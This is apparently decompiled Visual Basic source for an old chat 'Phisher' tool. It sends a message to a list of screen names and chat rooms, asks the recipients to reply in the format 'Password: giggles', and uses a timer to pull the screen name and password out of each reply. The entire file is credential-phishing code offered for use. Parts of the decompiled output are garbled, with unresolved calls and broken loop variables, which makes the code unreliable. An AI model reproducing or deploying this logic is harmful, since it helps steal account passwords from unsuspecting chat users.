VERSION 5.00
Begin VB.Form Form2
  Caption = "<>< Phisher by- ToX  -n-  thief  ><>"
  MousePointer = 99 'Custom
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Picture = "Form2.frx":0
  BorderStyle = 1 'Fixed Single
  Icon = "Form2.frx":8842
  LinkTopic = "Form2"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 150
  ClientTop = 435
  ClientWidth = 4065
  ClientHeight = 2970
  MouseIcon = "Form2.frx":8B4C
  StartUpPosition = 2 'CenterScreen
  Begin Timer Timer1
    Enabled = 0   'False
    Interval = 1
    Left = 0
    Top = 0
  End
  Begin CommandButton Command7
    Caption = "Create Phrase"
    Left = 2160
    Top = 2640
    Width = 1815
    Height = 255
    TabIndex = 11
  End
  Begin CommandButton Command6
    Caption = "Save Phrase To File"
    Left = 2160
    Top = 2400
    Width = 1815
    Height = 255
    TabIndex = 10
  End
  Begin CommandButton Command5
    Caption = "Load Phrase From File"
    Left = 2160
    Top = 2160
    Width = 1815
    Height = 255
    TabIndex = 9
  End
  Begin TextBox Text2
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 2160
    Top = 120
    Width = 1815
    Height = 1935
    Enabled = 0   'False
    Text = "Form2.frx":8E56
    TabIndex = 6
    MultiLine = -1  'True
    ScrollBars = 2
  End
  Begin CommandButton Command4
    Caption = "Options"
    Left = 120
    Top = 1560
    Width = 1815
    Height = 255
    TabIndex = 5
  End
  Begin TextBox Text1
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 120
    Top = 1200
    Width = 1815
    Height = 285
    Text = "Name"
    TabIndex = 4
  End
  Begin CommandButton Command3
    Caption = "Add Name"
    Left = 120
    Top = 2640
    Width = 1815
    Height = 255
    TabIndex = 3
  End
  Begin CommandButton Command2
    Caption = "Addroom"
    Left = 120
    Top = 2400
    Width = 1815
    Height = 255
    TabIndex = 2
  End
  Begin CommandButton Command1
    Caption = "Start"
    Left = 120
    Top = 2160
    Width = 1815
    Height = 255
    TabIndex = 1
  End
  Begin ListBox List1
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 120
    Top = 120
    Width = 1815
    Height = 1035
    TabIndex = 0
  End
  Begin Line Line1
    BorderColor = &H808080&
    X1 = 2040
    Y1 = 120
    X2 = 2040
    Y2 = 2880
  End
  Begin Label Label2
    Caption = "List Count:"
    ForeColor = &HFF&
    Left = 120
    Top = 1920
    Width = 855
    Height = 255
    TabIndex = 8
    BackStyle = 0 'Transparent
  End
  Begin Label Label1
    Caption = "0"
    ForeColor = &HFF&
    Left = 960
    Top = 1920
    Width = 975
    Height = 255
    TabIndex = 7
    BackStyle = 0 'Transparent
  End
  Begin Menu Options
    Visible = 0   'False
    Caption = "Options"
    Begin Menu Add
      Caption = "Add"
    End
    Begin Menu Addroom
      Caption = "Add Room"
    End
    Begin Menu removename
      Caption = "Remove Name"
    End
    Begin Menu Clearlist
      Caption = "Clear list"
    End
    Begin Menu dd
      Caption = "___________"
      Enabled = 0   'False
    End
    Begin Menu gfdfg
      Caption = "Start It"
    End
  End
End

Attribute VB_Name = "Form2"


Private Sub List1_DblClick() '477910
  loc_00477953: var_eax = Call Form2.removename_Click
End Sub

Private Sub Command6_Click() '476B80
  loc_00476C21: var_eax = Form5.Show var_18
End Sub

Private Sub Addroom_Click() '475ED0
  Dim var_1C As ListBox
  loc_00475F4C: var_eax = call Proc_2_3_478EC0(var_1C, var_24, var_1C)
  loc_00475F90: var_24 = List1.ListCount
  loc_00475FC2: var_18 = CStr(var_24)
  loc_00475FCA: var_eax = Unknown_VTable_Call[edi+00000054h]
  loc_00476006: GoTo loc_00476025
  loc_00476024: Exit Sub
  loc_00476025: 'Referenced from: 00476006
End Sub

Private Sub gfdfg_Click() '477450
  Dim var_38 As TextBox
  Dim var_4C As ListBox
  loc_004774F7: var_28 = Text2.Text
  loc_0047752D: edi = (var_28 = vbNullString) + 1
  loc_00477542: If (var_28 = vbNullString) + 1 = 0 Then GoTo loc_004775DE
  loc_00477582: var_5C = "Phish by- thief"
  loc_0047759D: var_4C = "You need a Phish message"
  loc_004775D9: GoTo loc_004778C7
  loc_004775DE: 'Referenced from: 00477542
  loc_004775FB: var_28 = List1.Text
  loc_00477631: edi = (var_28 = vbNullString) + 1
  loc_00477646: If (var_28 = vbNullString) + 1 = 0 Then GoTo loc_004775D1
  loc_00477681: var_5C = "Phish by- thief"
  loc_00477708: var_C0 = List1.ListCount
  loc_00477732: var_C0 = var_C0 - 0001h
  loc_0047774E: var_94 = var_C0
  loc_0047777C: For var_24 = "" To var_C0 Step 1
  loc_0047778F: If var_F0 = 0 Then GoTo loc_004775D1
  loc_004777B5: var_24 = CInt(var_28)
  loc_004777BD: var_38 = List1.List(var_24)
  loc_004777FA: var_30 = Text2.Text
  loc_0047783C: var_eax = call Proc_2_4_479360(var_28, var_30, var_3C)
  loc_00477876: Next var_24
  loc_0047787E: GoTo loc_0047778D
  loc_004778C6: Exit Sub
  loc_004778C7: 'Referenced from: 004775D9
  loc_004778E9: Exit Sub
End Sub

Private Sub removename_Click() '4779A0
  Dim var_20 As ListBox
  Dim var_B0 As ListBox
  loc_00477A25: var_A4 = List1.ListCount
  loc_00477A4F: setz bl
  loc_00477A5D: If ebx = 0 Then GoTo loc_00477A84
  loc_00477A7B: var_68 = "No One on List"
  loc_00477A82: GoTo loc_00477AFD
  loc_00477A84: 'Referenced from: 00477A5D
  loc_00477AA0: var_A4 = List1.SelCount
  loc_00477ACA: setz bl
  loc_00477AD8: If ebx = 0 Then GoTo loc_00477B48
  loc_00477AFD: 'Referenced from: 00477A82
  loc_00477B0A: var_30 = "Highlight Name"
  loc_00477B43: GoTo loc_00477C75
  loc_00477B48: 'Referenced from: 00477AD8
  loc_00477B5B: var_B0 = var_20
  loc_00477B7A: var_A4 = List1.ListIndex
  loc_00477BA8: var_eax = List1.RemoveItem var_A4
  loc_00477C07: var_A4 = List1.ListCount
  loc_00477C39: var_18 = CStr(var_A4)
  loc_00477C41: var_eax = Unknown_VTable_Call[esi+00000054h]
  loc_00477C75: 'Referenced from: 00477B43
  loc_00477C81: GoTo loc_00477CB8
  loc_00477CB7: Exit Sub
  loc_00477CB8: 'Referenced from: 00477C81
End Sub

Private Sub Timer1_Timer() '477D70
  loc_00477DFF: var_eax = call Proc_2_1_478A40(edi, esi, ebx)
  loc_00477E06: If call Proc_2_1_478A40(edi, esi, ebx) = 0 Then GoTo loc_00478413
  loc_00477E0C: var_eax = call Proc_2_1_478A40(, , )
  loc_00477E32: var_eax = call Proc_2_7_4799A0(, , )
  loc_00477E37: var_90 = call Proc_2_7_4799A0(, , )
  loc_00477E64: var_28 = LCase(call Proc_2_7_4799A0(, , ))
  loc_00477E72: var_eax = call Proc_2_6_479870(, , )
  loc_00477E7C: var_18 = call Proc_2_6_479870(, , )
  loc_00477E9B: var_eax = call Proc_47AC90(CLng(call Proc_2_1_478A40(, , )), , )
  loc_00477EB9: var_eax = call Proc_47AEC0(CLng(0.5), , )
  loc_00477EC2: var_eax = call Proc_2_5_4797C0(var_18, , )
  loc_00477EE8: var_C0 = "password:"
  loc_00477EFC: call InStr(var_98, InStr, var_C8, var_28, 00000001h)
  loc_00477F0B: var_E0 = CBool(InStr(var_98, InStr, var_C8, var_28, 00000001h))
  loc_00477F20: If var_E0 = 0 Then GoTo loc_00478411
  loc_00477F5A: var_A8 = LCase("Password:")
  loc_00477F76: call InStr(var_B8, 00000000h, var_A8, var_28, 00000001h)
  loc_00477F7D: var_48 = InStr(var_B8, 00000000h, var_A8, var_28, 00000001h)
  loc_00477FDB: var_58 = Mid(var_28, CLng(var_48), Len(var_28))
  loc_0047804E: var_98 = Trim(Right(var_58, CLng(Len(var_58) - 9)))
  loc_0047805D: var_68 = var_98
  loc_00478089: call InStr(var_98, 00000000h, var_C8, var_68, 00000001h)
  loc_004780A9: var_78 = Left(var_68, CLng(InStr(var_98, 00000000h, var_C8, var_68, 00000001h)))
  loc_00478109: var_C0 = var_18
  loc_0047812C: var_F8 = var_84
  loc_00478154: var_7C = CStr(Trim(var_18))
  loc_0047815E: var_eax = Unknown_VTable_Call[ecx+000001ECh]
  loc_00478208: var_FC = var_84
  loc_00478236: var_7C = CStr(Trim(var_78))
  loc_00478240: var_eax = Unknown_VTable_Call[edx+000001ECh]
  loc_004782EC: var_eax = Unknown_VTable_Call[edx+000001ECh]
  loc_00478383: var_eax = Unknown_VTable_Call[eax+00000050h]
  loc_004783BD: call __vbaStrR8
  loc_004783C8: var_80 = __vbaStrR8
  loc_004783D0: var_eax = Unknown_VTable_Call[esi+00000054h]
  loc_00478411: 'Referenced from: 00477F20
  loc_00478413: 'Referenced from: 00477E06
  loc_0047841C: GoTo loc_00478465
  loc_00478464: Exit Sub
  loc_00478465: 'Referenced from: 0047841C
  loc_00478492: Exit Sub
End Sub

Private Sub Form_Load() '477060
  loc_004770E9: var_18 = Me.Top
  loc_00477125: Me.Top = var_18
  loc_0047717C: var_18 = Me.Top
  loc_004771A6: Me.Left = var_18
  loc_004771DE: Me.Enabled = False
End Sub

Private Sub Form_Unload(Cancel As Integer) '477230
  loc_004772BA: var_1C = Me.Top
  loc_004772F6: Me.Top = var_1C
  loc_0047734D: var_1C = Me.Top
  loc_0047737B: Me.Left = var_1C
  loc_004773B3: Me.Enabled = True
  loc_004773EB: Timer1.Enabled = False
  loc_00477415: GoTo loc_00477421
  loc_00477420: Exit Sub
  loc_00477421: 'Referenced from: 00477415
  loc_00477421: Exit Sub
End Sub

Private Sub Command7_Click() '476C70
  Dim var_20 As Variant
  Dim var_60 As TextBox
  loc_00476CE6: var_18 = Command7.Caption
  loc_00476D16: edi = (var_18 = "Create Phrase") + 1
  loc_00476D2E: If (var_18 = "Create Phrase") + 1 = 0 Then GoTo loc_00476D99
  loc_00476D44: Text2.Enabled = True
  loc_00476D87: Command7.Caption = "Set Phrase"
  loc_00476D8E: If edi >= 0 Then GoTo loc_00476F1A
  loc_00476D94: GoTo loc_00476F0B
  loc_00476D9F: var_2C = edi
  loc_00476DB9: var_4C = "(Please respond in this formatt: Password: giggles)"
  loc_00476DC7: call InStr(var_44, 00000000h, var_54, var_34, 00000001h, var_20, %ecx = "", Me, var_20, (var_18 = "Create Phrase"), Me, var_20, var_54, Me, %ecx = "", edi)
  loc_00476DED: If CBool(InStr(var_44, 00000000h, var_54, var_34, 00000001h, var_20, var_44 <> "", Me, var_20, (var_18 <> "Create Phrase") <> 0 Then GoTo loc_00476EA8
  loc_00476E03: var_60 = var_34
  loc_00476E1F: var_18 = Text2.Text
  loc_00476E67: Text2.Text = var_18 & "(Please respond in this formatt: Password: giggles)"
  loc_00476EA8: 'Referenced from: 00476DED
  loc_00476EBF: Text2.Enabled = False
  loc_00476F02: Command7.Caption = "Create Phrase"
  loc_00476F09: If var_20 >= 0 Then GoTo loc_00476F1A
  loc_00476F0B: 'Referenced from: 00476D94
  loc_00476F14: var_20 = CheckObj(var_20, var_00414548, 84)
  loc_00476F1A: 'Referenced from: 00476D8E
  loc_00476F2B: GoTo loc_00476F61
  loc_00476F60: Exit Sub
  loc_00476F61: 'Referenced from: 00476F2B
End Sub

Private Sub Add_Click() '475B00
  Dim var_28 As ListBox
  loc_00475B8C: var_1C = Text1.Text
  loc_00475BB9: var_18 = var_1C
  loc_00475BE1: var_1C = Text1.Text
  loc_00475C18: var_20 = Text1.Text
  loc_00475C4F: edi = (var_20 = "Name") + 1
  loc_00475C64: eax = (var_1C = vbNullString) + 1
  loc_00475C8C: If (var_1C = vbNullString) + 1 = 0 Then GoTo loc_00475CFC
  loc_00475CBE: var_38 = "Add screen name"
  loc_00475CF7: GoTo loc_00475E53
  loc_00475CFC: 'Referenced from: 00475C8C
  loc_00475D3D: var_eax = List1.AddItem var_18, var_6C
  loc_00475D77: var_B8 = var_28
  loc_00475D96: var_AC = List1.ListCount
  loc_00475DCE: var_1C = CStr(var_AC)
  loc_00475DDE: var_eax = Unknown_VTable_Call[ecx+00000054h]
  loc_00475E2C: Text1.Text = vbNullString
  loc_00475E53: 'Referenced from: 00475CF7
  loc_00475E5F: GoTo loc_00475E9D
  loc_00475E9C: Exit Sub
  loc_00475E9D: 'Referenced from: 00475E5F
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer) '477CE0
  loc_00477D27: If KeyAscii <> 13 Then GoTo loc_00477D48
  loc_00477D2C: var_eax = Call Form2.Add_Click
  loc_00477D48: 'Referenced from: 00477D27
End Sub

Private Sub Clearlist_Click() '476050
  loc_004760D9: var_C0 = List1.ListCount
  loc_00476103: setz al
  loc_0047612F: If eax = 0 Then GoTo loc_00476183
  loc_00476145: var_3C = "No One on List"
  loc_0047617E: GoTo loc_004762C6
  loc_00476183: 'Referenced from: 0047612F
  loc_004761CE: var_24 = MsgBox("Clear List", 36, var_4C, var_5C, var_6C)
  loc_0047620E: If (var_24 = 6) = 0 Then GoTo loc_004762AA
  loc_0047622D: var_eax = List1.Clear
  loc_00476278: var_28 = CStr(0)
  loc_00476280: var_eax = Unknown_VTable_Call[edi+00000054h]
  loc_004762AA: 'Referenced from: 0047620E
  loc_004762C6: 'Referenced from: 0047617E
  loc_004762CE: GoTo loc_004762FE
  loc_004762FD: Exit Sub
  loc_004762FE: 'Referenced from: 004762CE
End Sub

Private Sub Command2_Click() '476720
  Dim var_1C As ListBox
  loc_0047679C: var_eax = call Proc_2_3_478EC0(var_1C, var_24, var_1C)
  loc_004767E0: var_24 = List1.ListCount
  loc_00476812: var_18 = CStr(var_24)
  loc_0047681A: var_eax = Unknown_VTable_Call[edi+00000054h]
  loc_00476856: GoTo loc_00476875
  loc_00476874: Exit Sub
  loc_00476875: 'Referenced from: 00476856
End Sub

Private Sub Command1_Click() '476330
  Dim var_38 As Variant
  loc_004763D7: var_28 = Text2.Text
  loc_0047640D: edi = (var_28 = vbNullString) + 1
  loc_00476422: If (var_28 = vbNullString) + 1 = 0 Then GoTo loc_0047649A
  loc_0047645D: var_4C = "you need a message"
  loc_00476495: GoTo loc_00476685
  loc_0047649A: 'Referenced from: 00476422
  loc_004764CE: var_C0 = List1.ListCount
  loc_004764F8: var_C0 = var_C0 - 0001h
  loc_00476514: var_94 = var_C0
  loc_00476542: For var_24 = "" To var_C0 Step 1
  loc_00476555: If var_E0 = 0 Then GoTo loc_00476649
  loc_0047657B: var_24 = CInt(var_28)
  loc_00476583: var_38 = List1.List(var_24)
  loc_004765C0: var_30 = Text2.Text
  loc_00476602: var_eax = call Proc_2_4_479360(var_28, var_30, var_3C)
  loc_0047663C: Next var_24
  loc_00476644: GoTo loc_00476553
  loc_00476649: 'Referenced from: 00476555
  loc_00476664: Timer1.Enabled = True
  loc_00476685: 'Referenced from: 00476495
  loc_0047668D: GoTo loc_004766D3
  loc_004766D2: Exit Sub
  loc_004766D3: 'Referenced from: 0047668D
  loc_004766F5: Exit Sub
End Sub

Private Sub Command3_Click() '4768A0
  loc_004768E3: var_eax = Call Form2.Add_Click
End Sub

Private Sub Command4_Click() '476930
  loc_00476A30: var_eax = Unknown_VTable_Call[ebx+000002BCh]
  loc_00476A63: GoTo loc_00476A6F
  loc_00476A6E: Exit Sub
  loc_00476A6F: 'Referenced from: 00476A63
End Sub

Private Sub Command5_Click() '476A90
  loc_00476B31: var_eax = Form4.Show var_18
End Sub

Public Sub Proc_1_17_476F90
  loc_00476FDF: var_eax = call Proc_2_1_478A40(edi, esi, ebx)
  loc_00476FE4: var_18 = call Proc_2_1_478A40(edi, esi, ebx)
  loc_00477026: GoTo loc_00477044
  loc_00477043: Exit Sub
  loc_00477044: 'Referenced from: 00477026
End Sub
